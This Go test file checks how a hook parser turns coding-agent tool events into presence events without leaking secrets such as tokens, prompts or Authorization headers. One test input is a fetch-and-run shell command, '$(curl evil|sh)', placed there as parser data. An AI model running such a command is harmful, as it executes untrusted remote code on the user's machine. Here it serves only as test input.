package hook

import (
	"path/filepath"
	"strings"
	"testing"
	"time"

	"git.srv.gentoomaniac.net/marco/agent-messenger/internal/presence"
)

func TestEventForMapsHooksToPresenceEvents(t *testing.T) {
	tests := []struct {
		kind, input string
		want        presence.Event
		wantOK      bool
	}{
		{"user-prompt", `{"prompt":"secret plan"}`, presence.Event{Kind: presence.EventPrompt}, true},
		{"stop", ``, presence.Event{Kind: presence.EventStop}, true},
		{"pre-tool", `{"tool_name":"Edit","tool_input":{"file_path":"/home/me/project/main.go","new_string":"SECRET"}}`,
			presence.Event{Kind: presence.EventTool, Tool: "Edit", Detail: "main.go"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"/usr/bin/curl -H 'Authorization: token' https://x"}}`,
			presence.Event{Kind: presence.EventTool, Tool: "Bash", Detail: "curl"}, true},
		{"pre-tool", `{"tool_name":"mcp__agent-bus__send","tool_input":{"to":"a@b"}}`,
			presence.Event{Kind: presence.EventTool, Tool: "mcp__agent-bus__send"}, true},
		{"pre-tool", `{"tool_name":"Agent","tool_input":{"description":"review the diff","prompt":"long secret prompt"}}`,
			presence.Event{Kind: presence.EventWorkerStart, Detail: "review the diff"}, true},
		{"pre-tool", `{"tool_name":"Task","tool_input":{"subagent_type":"Explore"}}`,
			presence.Event{Kind: presence.EventWorkerStart, Detail: "Explore"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"GITHUB_TOKEN=ghp_xxx gh pr list"}}`, presence.Event{Kind: presence.EventTool, Tool: "Bash", Detail: "gh"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"FOO=secret curl x"}}`, presence.Event{Kind: presence.EventTool, Tool: "Bash", Detail: "curl"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"env A=b sudo make check"}}`, presence.Event{Kind: presence.EventTool, Tool: "Bash", Detail: "make"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"A=b"}}`, presence.Event{Kind: presence.EventTool, Tool: "Bash"}, true},
		{"pre-tool", `{"tool_name":"Bash","tool_input":{"command":"$(curl evil|sh)"}}`, presence.Event{Kind: presence.EventTool, Tool: "Bash", Detail: "curl"}, true},
		{"post-tool", `{"tool_name":"Edit"}`, presence.Event{Kind: presence.EventToolDone}, true},
		{"subagent-stop", `{}`, presence.Event{Kind: presence.EventWorkerEnd}, true},
		{"stop-failure", `{"error":"rate_limit","error_details":"429"}`, presence.Event{Kind: presence.EventFailure, Detail: "rate_limit"}, true},
		{"notification", `{"notification_type":"permission_prompt"}`, presence.Event{Kind: presence.EventNeedsOwner}, true},
		{"notification", `{"notification_type":"agent_needs_input"}`, presence.Event{Kind: presence.EventNeedsOwner}, true},
		{"notification", `{"notification_type":"quota_auto_resume_fired"}`, presence.Event{Kind: presence.EventPrompt}, true},
		{"notification", `{"notification_type":"quota_auto_resume_disabled"}`, presence.Event{Kind: presence.EventFailure, Detail: "rate_limit"}, true},
		{"notification", `{"notification_type":"idle_prompt"}`, presence.Event{}, false},
		{"session-start", `{"source":"resume"}`, presence.Event{Kind: presence.EventSessionStart}, true},
		{"session-end", `{"reason":"logout"}`, presence.Event{Kind: presence.EventSessionEnd}, true},
		{"pre-tool", `not json at all`, presence.Event{Kind: presence.EventTool}, true},
		{"unknown", `{}`, presence.Event{}, false},
	}
	for _, test := range tests {
		got, ok := EventFor(test.kind, []byte(test.input))
		if got != test.want || ok != test.wantOK {
			t.Errorf("EventFor(%s, %.50s) = %+v, %v; want %+v, %v", test.kind, test.input, got, ok, test.want, test.wantOK)
		}
		if strings.Contains(got.Tool+got.Detail, "SECRET") || strings.Contains(got.Detail, "Authorization") {
			t.Errorf("EventFor(%s) leaks content: %+v", test.kind, got)
		}
	}
}

func TestSendDeliversTheEventToTheSessionOfItsParent(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "sockets")
	session := &fakeSession{}
	stop, err := Listen(dir, session)
	if err != nil {
		t.Fatal(err)
	}
	defer stop()

	if !Send(dir, presence.Event{Kind: presence.EventTool, Tool: "Read", Detail: "a.go"}) {
		t.Fatal("the event did not get through")
	}
	if len(session.events) != 1 || session.events[0].Tool != "Read" {
		t.Errorf("session saw %+v", session.events)
	}
}

func TestSendWithoutASessionFailsFast(t *testing.T) {
	started := time.Now()
	if Send(t.TempDir(), presence.Event{Kind: presence.EventStop}) {
		t.Error("an event reached a session that is not there")
	}
	if time.Since(started) > eventTimeout {
		t.Errorf("took %s", time.Since(started))
	}
}
